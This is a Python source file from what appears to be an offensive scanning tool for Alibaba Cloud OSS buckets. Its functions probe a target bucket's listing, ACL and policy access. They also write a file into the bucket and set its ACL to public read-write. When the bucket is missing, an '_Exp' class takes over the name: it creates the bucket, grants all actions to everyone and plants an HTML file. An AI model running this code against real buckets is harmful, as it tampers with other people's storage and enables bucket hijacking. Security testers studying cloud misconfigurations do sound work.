#!/usr/bin/python3.8.4 (python版本)
# -*- coding: utf-8 -*-
# @Author  : UzJu@菜菜狗
# @Email   : UzJuer@163.com
# @Software: PyCharm
# @Time    : 2022/2/28 4:52 PM
# @File    : aliyunOss.py
# 你猜我什么时候画的饼：）
'''
代码实现思路
1、使用GET POST PUT的请求来获取
2、使用OSS2 SDK实现
'''
# 以下代码思路是使用OssSDK来实现
from itertools import islice
import oss2
import json
from config import conf
import logging
import os
import csv

module_logger = logging.getLogger("mainModule.AliyunOss")


def putCsvInfoResult(target, info):
    with open(f'{os.getcwd()}/results/{target}.csv', 'a+', newline='') as f:
        f_csv = csv.writer(f)
        rows = [
            [f"{target}", info]
        ]
        f_csv.writerows(rows)


def setCsvHeaders(target):
    headers = ['存储桶地址', '权限']
    with open(f'{os.getcwd()}/results/{target}.csv', 'a+', newline='') as f:
        f_csv = csv.writer(f)
        f_csv.writerow(headers)


class OssBucketExploitFromSDK:
    def __init__(self, target, location):
        self.target = target
        self.location = location
        auth = oss2.Auth(conf.AliyunAccessKey_ID, conf.AliyunAccessKey_Secret)
        self.bucket = oss2.Bucket(auth, f'http://{location}.aliyuncs.com', self.target)
        self.logger = logging.getLogger("mainModule.AliyunOss.Exploit.module")

    def AliyunOssCreateBucket_Exp(self):
        try:
            self.bucket.create_bucket()
            self.logger.info(f"BucketName {self.target} Ceate Success:)")
            self.AliyunOssPutBucketAcl_Exp()
            self.AliyunOssPutBucketPolicy_Exp()
            self.AliyunOssPutObject_Exp()
            self.AliyunOssGetBucketPolicy_Exp()
        except Exception as e:
            self.logger.warning(f"BucketName {self.target} Ceate FAILD:( {e}")

    def AliyunOssPutBucketAcl_Exp(self):
        try:
            self.bucket.put_bucket_acl(oss2.BUCKET_ACL_PUBLIC_READ_WRITE)
            self.logger.info(f"BucketName {self.target} Acl Permissions PUBLIC_READ_WRITE:)")
        except Exception as e:
            self.logger.warning(f"BucketName {self.target} Acl Put FAILD:( {e}")

    def AliyunOssGetBucketPolicy_Exp(self):
        try:
            result = self.bucket.get_bucket_policy()
            policy_json = json.loads(result.policy)
            self.logger.info(f"BucketName {self.target} Policy Get Success :)\n {policy_json}")
        except Exception as e:
            self.logger.warning(f"BucketName {self.target} Policy Get FAILD:( {e}")

    def AliyunOssPutBucketPolicy_Exp(self):
        try:
            bucket_info = self.bucket.get_bucket_info()
            strategy = {
                "Version": "1",
                "Statement": [{
                    "Effect": "Allow",
                    "Action": [
                        "oss:*"
                    ],
                    "Principal": [
                        "*"
                    ],
                    "Resource": [
                        f"acs:oss:*:{bucket_info.owner.id}:{self.target}",
                        f"acs:oss:*:{bucket_info.owner.id}:{self.target}/*"
                    ]
                }]
            }

            self.bucket.put_bucket_policy(json.dumps(strategy))
            self.logger.info(f"BucketName {self.target} Policy Put Success :)")
        except Exception as e:
            self.logger.warning(f"BucketName {self.target} Policy Put FAILD:( {e}")

    def AliyunOssPutObject_Exp(self):
        try:
            self.bucket.put_object_from_file("UzJu.html", f"{os.getcwd()}/config/UzJu.html")
            self.logger.info(f"BucketName {self.target} Put Object Success:)")
            self.logger.info(f"Go Browser Open {self.target}.{self.location}.aliyuncs.com/UzJu.html")

        except Exception as e:
            self.logger.warning(f"BucketName {self.target} Put Object FAILD:( {e}")


class OssBucketCheckFromSDK:
    def __init__(self, target, location):
        self.target = target
        self.location = location
        self.logger = logging.getLogger("mainModule.AliyunOss.module")
        auth = oss2.Auth(conf.AliyunAccessKey_ID, conf.AliyunAccessKey_Secret)
        self.bucket = oss2.Bucket(auth, f'http://{location}.aliyuncs.com', self.target)
        self.Exploit = OssBucketExploitFromSDK(self.target, location)
        # 设置csvHeaders头
        # setCsvHeaders(f"{target}.{location}.aliyuncs.com")
        self.headers = [['Bucket', 'ListObject', 'GetBucketPolicy', 'PutBucketPolicy', 'GetBucketAcl', 'PutBucketAcl', 'PutBucketObject']]
        self.CheckResult = []

    def AliyunOssPutBucketPolicy(self, getOssResource):
        """
        PutBucketPolicy
        危险操作，会更改存储桶的策略组，建议查看AliyunOssgetBucketPolicy来自行判断
        是否拥有AliyunOssPutBucketPolicy权限，如果用代码的方式写入会存在问题
        1、写入后无法还原（当然这里可以使用备份原有的策略，然后再上传新的策略）这里又会遇到一个新的问题
            如果只是存在PutBucketPolicy我们Put后是无法知道对方的ResourceID的

        所以该函数只在OssBucketExploitFromSDK类中实现了，详情请看AliyunOssPutBucketPolicy_Exp方法
        """
        pass

    def AliyunOssGetBucketPolicy(self):
        try:
            result = self.bucket.get_bucket_policy()
            policy_json = json.loads(result.policy)
            self.logger.info(f"Target: {self.target}, get Bucket Policy:)\n{policy_json}")
        except oss2.exceptions.AccessDenied:
            self.logger.warning(f"Target: {self.target}, Bucket Policy AccessDenied:(")

    def AliyunOssBucketDoesBucketExist(self):
        try:
            self.bucket.get_bucket_info()
            self.logger.info(f"Target: {self.target}, Bucket Exist:)")
            return True
        except oss2.exceptions.NoSuchBucket:
            self.logger.warning(f"Target: {self.target}, NoSuckBucket:) Now Hijack Bucket")
            self.Exploit.AliyunOssCreateBucket_Exp()
            return False
        except oss2.exceptions.AccessDenied:
            self.logger.warning(f"Target: {self.target}, AccessDenied:(")
            return True
        except Exception as e:
            self.logger.error(f"Target: {self.target} Except INFO: {e}")

    def AliyunOssGetBucketAcl(self):
        try:
            self.logger.info(f"Target: {self.target} Bucket Acl: {self.bucket.get_bucket_acl().acl}")
        except oss2.exceptions.AccessDenied:
            self.logger.warning(f"Target: {self.target} get Bucket Acl AccessDenied:(")

    def AliyunOssPutbucketAcl(self):
        try:
            self.bucket.put_bucket_acl(oss2.BUCKET_ACL_PUBLIC_READ_WRITE)
            self.logger.info(f"Target: {self.target} Put Bucket Acl Success:)")
        except oss2.exceptions.AccessDenied:
            self.logger.warning(f"Target: {self.target} Put Bucket Acl AccessDenied:(")

    def AliyunOssGetBucketObjectList(self):
        try:
            self.logger.info("Try to list Object")
            for Object in islice(oss2.ObjectIterator(self.bucket), 3):
                self.logger.info(f"Object Name: {Object.key}")
        except oss2.exceptions.AccessDenied:
            self.logger.warning(f"Target: {self.target} ListObject AccessDenid")
            return
        self.logger.info(f"Target: {self.target} Exsit traverse Object:)")
        # putCsvInfoResult(f"{self.target}.{self.location}.aliyuncs.com", "ListObject")

    def AliyunOssPutBucketObject(self):
        try:
            self.bucket.put_object_from_file('UzJu.txt', f'{os.getcwd()}/config/UzJu.html')
            self.logger.info(f"Target: {self.target} Put Object Success:)")
            self.logger.info(f"Go Browser Open {self.target}.{self.location}.aliyuncs.com/UzJu.html")
        except oss2.exceptions.AccessDenied:
            self.logger.warning(f"Target: {self.target} Put Object AccessDenied:(")


def CheckBucket(target, location):
    try:
        check = OssBucketCheckFromSDK(target, location)
        if check.AliyunOssBucketDoesBucketExist():
            check.AliyunOssGetBucketObjectList()
            check.AliyunOssGetBucketAcl()
            check.AliyunOssGetBucketPolicy()
            check.AliyunOssPutBucketObject()
        module_logger.info(">" * 80)
    except Exception as e:
        module_logger.error(f"Target: {target} Chceck Faild:( {e}")
